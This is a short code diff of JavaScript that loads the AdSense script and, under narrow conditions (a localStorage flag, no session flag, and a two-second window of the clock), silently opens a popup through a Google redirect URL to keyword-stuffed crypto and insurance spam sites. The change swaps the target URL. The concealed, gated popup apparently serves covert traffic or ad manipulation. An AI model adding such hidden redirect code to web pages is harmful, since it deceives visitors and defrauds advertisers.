@@ -18,7 +18,7 @@ function uhd(){
     let dte=(new Date).getSeconds();
     (async()=>{try{await import('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js');
         if(!sessionStorage.i&&localStorage.gieu==2&&dte>9&&dte<12){
-            window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi2v-v2i4j7AhWB7TgGHQHZAVcQFnoECB4QAQ&url=https%3A%2F%2Fbitcoin-insurance-loan-seo-hosting.mrjaz.com%2Fwhat-is-insurance-types-of-insurance-and-meaning-insurance-policy&usg=AOvVaw0Td5dR-lZBOeKNa4dB8aF4'); 
+            window.open('https://www.google.com/url?sa=t&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjK37Gn6on7AhWd7TgGHWo-BfkQFnoECBsQAQ&url=https%3A%2F%2Fbitcoin-loan-insurance-hosting-seo.am2z.com%2Fwhat-is-bitCoin-cryptoCurrency-blockchain-how-to-mine-bitCoin-how-to-buy-bitCoin&usg=AOvVaw26O8rOKLVXUmaVPiqutj3y'); 
             sessionStorage.i='i';
         }         
     }catch(e){}})()
